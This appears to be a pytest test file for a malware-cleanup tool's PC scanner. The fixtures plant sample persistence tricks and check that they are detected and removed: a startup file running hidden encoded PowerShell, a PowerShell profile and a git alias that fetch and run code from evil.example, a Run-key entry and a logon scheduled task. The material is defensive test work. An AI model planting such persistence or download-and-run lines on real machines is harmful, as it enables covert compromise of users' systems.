"""This PC checks, on a fake home folder (every OS) and on the real registry and Task Scheduler (Windows only)."""
import base64, os, subprocess, sys

import pytest

from conftest import LOADER, PAD, core, write

ENC = base64.b64encode("Write-Output pwned-by-test".encode("utf-16-le")).decode()


@pytest.fixture
def home(tmp_path, monkeypatch):
    h = tmp_path / "home"
    monkeypatch.setenv("REPOGUARD_TEST_HOME", str(h))
    roaming, temp = h / "AppData" / "Roaming", h / "AppData" / "Local" / "Temp"
    startup = roaming / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    write(startup / "updater.bat", f"@echo off\r\npowershell -w hidden -enc {ENC}\r\n")
    write(startup / "notes.txt", "just a note\n")
    write(temp / "x1" / "loader.js", "x" + PAD + LOADER + "\n")
    write(temp / "x2" / "build.js", "console.log('a normal build script, nothing to see');\n")
    write(temp / "repoguard-copy" / "rules.js", LOADER + "\n")  # RepoGuard's own files hold signatures
    write(roaming / "Code" / "User" / "settings.json", '{\n  "editor.tabSize": 2,\n  "task.allowAutomatic' 'Tasks": "on"\n}\n')
    write(h / "Documents" / "WindowsPowerShell" / "Microsoft.PowerShell_profile.ps1",
          "Set-Alias ll Get-ChildItem\r\niex (New-Object Net.WebClient).DownloadString('http://evil.example/a')\r\n")
    write(h / ".gitconfig", "[alias]\n\tst = status\n\tup = !curl -s http://evil.example/x | sh\n")
    return h


def scan(tmp_path):
    rc, r, err = core("pc_agent", "scan", "--backup", str(tmp_path / "bk"))
    assert r, err
    return r


def test_finds_the_bad_things_and_nothing_else(home, tmp_path):
    r = scan(tmp_path)
    got = {(f["kind"], os.path.basename(f["path"])) for f in r["findings"]}
    assert ("startup", "updater.bat") in got
    assert ("tempfile", "loader.js") in got
    assert ("file", "settings.json") in got
    assert ("shell", "Microsoft.PowerShell_profile.ps1") in got
    assert ("gitconfig", ".gitconfig") in got
    names = {os.path.basename(f["path"]) for f in r["findings"]}
    assert "build.js" not in names and "notes.txt" not in names and "rules.js" not in names
    assert {i["label"] for i in r["inventory"]} >= {"updater.bat", "notes.txt"}
    assert r["errors"] == []


def test_fixes_only_what_was_chosen_and_backs_it_up(home, tmp_path):
    r = scan(tmp_path)
    pick = [f["id"] for f in r["findings"] if f["kind"] in ("startup", "tempfile", "shell", "file")]
    rc, out, err = core("pc_agent", "clean", "--backup", str(tmp_path / "bk"), "--ids", *pick)
    assert out, err
    assert all(x["ok"] for x in out["results"]), out["results"]
    startup = home / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    assert not (startup / "updater.bat").exists() and (startup / "notes.txt").exists()
    assert not (home / "AppData" / "Local" / "Temp" / "x1" / "loader.js").exists()
    prof = (home / "Documents" / "WindowsPowerShell" / "Microsoft.PowerShell_profile.ps1").read_text()
    assert "DownloadString" not in prof and "Set-Alias ll" in prof
    assert "allowAutomaticTasks" not in (home / "AppData" / "Roaming" / "Code" / "User" / "settings.json").read_text()
    assert (home / ".gitconfig").read_text().count("evil.example") == 1, "git config is only reported, never edited"
    left = {f["kind"] for f in out["findings"]}
    assert left == {"gitconfig"}
    backups = [n for _, _, ns in os.walk(out["backup"]) for n in ns]
    assert any(n.startswith("updater.bat") for n in backups) and any(n.startswith("loader.js") for n in backups)


@pytest.mark.skipif(os.name != "nt", reason="real registry and Task Scheduler")
def test_real_run_key_and_scheduled_task(tmp_path):
    import winreg
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    name = "RepoGuardTestEvil"
    script = tmp_path / "evil" / "init.js"
    write(script, "x" + PAD + LOADER + "\n")
    # tmp_path is under %TEMP%, a risky place, and the script holds the malware's marker
    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as k:  # a fresh PC may not have it yet
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, f"powershell -w hidden -enc {ENC}")
    subprocess.run(["schtasks", "/Create", "/TN", name, "/TR", f'node "{script}"', "/SC", "ONLOGON", "/F"], check=True,
                   capture_output=True)
    try:
        rc, r, err = core("pc_agent", "scan", "--backup", str(tmp_path / "bk"))
        assert r, err
        mine = [f for f in r["findings"] if name in f["path"] or name in f.get("label", "")]
        kinds = {f["kind"] for f in mine}
        assert kinds == {"runkey", "task"}, (kinds, r["errors"])
        rc, out, err = core("pc_agent", "clean", "--backup", str(tmp_path / "bk"), "--ids", *[f["id"] for f in mine])
        assert out and all(x["ok"] for x in out["results"]), (out, err)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key) as k:
            with pytest.raises(FileNotFoundError):
                winreg.QueryValueEx(k, name)
        assert subprocess.run(["schtasks", "/Query", "/TN", name], capture_output=True).returncode != 0
    finally:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, name)
        except OSError:
            pass
        subprocess.run(["schtasks", "/Delete", "/TN", name, "/F"], capture_output=True)
